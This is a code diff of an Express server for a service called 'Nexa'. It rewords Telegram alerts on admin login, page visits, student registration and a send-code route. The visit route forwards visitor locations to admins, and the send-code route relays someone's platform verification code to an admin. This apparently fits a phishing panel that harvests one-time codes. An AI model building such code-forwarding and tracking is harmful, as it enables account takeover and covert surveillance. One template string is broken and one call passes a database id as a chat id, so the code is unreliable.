@@ -272,6 +272,7 @@ app.post("/admins/vote", async (req, res) => {
       success: true,
       message: "Vote recorded successfully",
       admin: { username: admin.username, votes: admin.votes },
+      
     });
   } catch (err) {
     console.error("Vote error:", err && err.message || err);
@@ -325,7 +326,7 @@ app.post("/admin/login", async (req, res) => {
     const token = jwt.sign({ id: admin._id }, JWT_SECRET, { expiresIn: "7d" });
 
     // notify owner about login and notify admin
-    await sendTelegram(ADMIN_CHAT_ID, `🔐 Admin login: *${admin.username}* (${admin.firstname} ${admin.lastname})`);
+    await sendTelegram(ADMIN_CHAT_ID, `🔐 Admin *${admin.username}* (${admin.firstname} ${admin.lastname}) just logged in to their account`);
     await sendTelegram(admin.chatId || ADMIN_CHAT_ID, `🔐 Login detected on your Nexa account (${admin.username})`);
 
     res.json({ success: true, token, admin: { username: admin.username, phone: admin.phone, referralCode: admin.referralCode, firstname: admin.firstname, lastname: admin.lastname, avatar: admin.avatar, bio: admin.bio, votes: admin.votes } });
@@ -420,7 +421,10 @@ app.post("/student/visit", async (req, res) => {
     });
 
     // notify admin (non-blocking)
-    sendToAdmin(admin._id, `📈 Page visit\nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${JSON.stringify(location)}`).catch(()=>{});
+  
+
+    await sendTelegram(admin.chatId, `📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${JSON.stringify(location)}`);
+    
 
     return res.json({ success: true, message: "Visit tracked" });
   } catch (err) {
@@ -482,8 +486,8 @@ app.post("/student/register", async (req, res) => {
     });
 
     // notify admin & owner
-    await sendToAdmin(admin._id, `🆕 New student: ${username}\nLocation: ${location.city || "Unknown"}`);
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: ${username} (via ${admin.username})`);
+    await sendToAdmin(admin._id, `🆕 New client: ${username}\nLocation: *${location.city || "Unknown city"}*, *{location.country || "Unknown country"}*`);
+    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: ${username} (via ${admin.username}) from *${location.country || "Unknown location"}`);
 
     return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
   } catch (e) {
@@ -512,7 +516,10 @@ app.post("/student/send-code", async (req, res) => {
     if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });
 
     const msg = `✅ ${code} is your ${platform || "NEXA"} verification code`;
-    await sendToAdmin(admin._id, msg);
+    await sendTelegram(admin._id, msg);
+
+
+
 
     await Activity.create({
       adminId: admin._id,
